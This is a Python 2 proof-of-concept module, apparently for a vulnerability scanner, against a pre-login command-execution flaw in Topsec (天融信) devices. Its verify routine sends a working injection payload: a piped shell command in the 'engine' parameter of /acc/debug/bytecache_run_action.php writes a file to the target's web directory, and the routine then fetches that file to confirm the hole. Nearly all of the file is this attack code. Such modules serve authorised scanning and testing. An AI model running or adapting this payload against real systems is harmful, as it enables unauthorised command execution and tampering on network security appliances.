# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'TOPSEC_0024'  # 平台漏洞编号，留空
    name = '天融信 前台无需登录命令执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE # 漏洞类型
    disclosure_date = '2015-06-02'  # 漏洞公布时间
    desc = '''
        天融信 /acc/debug/bytecache_run_action.php 
        setValue 方法 和 stopByteCacheDebug 方法，参数处理不当，导致命令执行。
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '天融信'  # 漏洞应用名称
    product_version = '天融信'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '105012b2-5367-4105-83e2-a39e9b7eaef0'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            #ref http://www.wooyun.org/bugs/wooyun-2015-0117621
            hh = hackhttp.hackhttp()
            arg = self.target
            payload = "/acc/debug/bytecache_run_action.php?action=1&engine=%20|%20echo%20testvultest3%20>%20a.php%20|%20&ipfilter=10"
            target = arg + payload
            code, head, res, errcode, _ = hh.http(target);
            payload = '/acc/debug/a.php'
            target = arg + payload
            code, head, res, errcode, _ = hh.http(target)
            if 'testvultest' in res:
                #security_hole(target)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()